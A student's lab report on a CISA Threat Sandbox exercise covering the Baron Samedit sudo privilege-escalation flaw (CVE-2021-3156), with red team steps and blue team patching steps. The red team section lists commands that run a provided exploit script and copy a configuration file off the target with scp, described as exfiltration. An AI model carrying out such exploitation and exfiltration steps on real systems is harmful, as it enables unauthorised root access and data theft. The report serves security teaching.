# Challenge Report: Baron Samedit CVE-2021-3156  
**Course:** CORe 463/563  
**Student:** Ian Sweet  
**Email:** iansweet315@u.boisestate.edu  

---

## Challenge Overview

This challenge, delivered through the CISA Threat Sandbox, centers on Baron Samedit (CVE-2021-3156), a known privilege escalation vulnerability. It involves both red team and blue team components:

- **Red Team**: Exploiting the CVE to exfiltrate a target configuration file.
- **Blue Team**: Patching the system to secure it against the vulnerability.

All scripts and update packages were provided in the XP CyberRange environment.

---

## Network Configuration

- **Security-Desk**: `172.16.200.12`
- **Red Target System**: `172.16.100.90`
- **Blue Target System**: `172.16.100.100`

---

## Red Team Procedure

1. SSH into Red Target.
2. Verify vulnerable sudo version (`1.8.27`).
3. Locate and transfer `exploit_nss.py` using `scp`.
4. Execute the exploit on Red Target via `python3`.
5. Access and copy `/opt/config.json` to home directory.
6. Exfiltrate file using `scp` to Security-Desk.

**Key Commands:**
```bash
scp ~/Desktop/Resources/exploit_nss.py playerone@172.16.100.90:/home/playerone/
python3 exploit_nss.py
scp playerone@172.16.100.90:/home/playerone/config.json ~/Desktop/Exfiltration-Artifacts/
```

---

## Blue Team Procedure

1. SSH into Blue Target.
2. Confirm vulnerable sudo version (`1.8.27`).
3. Transfer patch `.deb` package from Security-Desk.
4. Install patch using `dpkg`.
5. Confirm updated version is `1.8.31`.

**Key Commands:**
```bash
scp ~/Desktop/Resources/sudo_1.8.31-1ubuntu1.5_amd64.deb playerone@172.16.100.100:/home/playerone/
sudo dpkg -i sudo_1.8.31-1ubuntu1.5_amd64.deb
sudo --version
```

---

## Tools and Resources Used

- CVE research
- Secure Copy Protocol (`scp`)
- `dpkg`, `ssh`, `chown`, `cp`, `sudo`
- YouTube: Linux command refreshers

---

## Outcome

Both red team (exfiltration) and blue team (patch verification) objectives were successfully completed. The exercise emphasized the significance of patch management and hands-on vulnerability exploitation techniques.
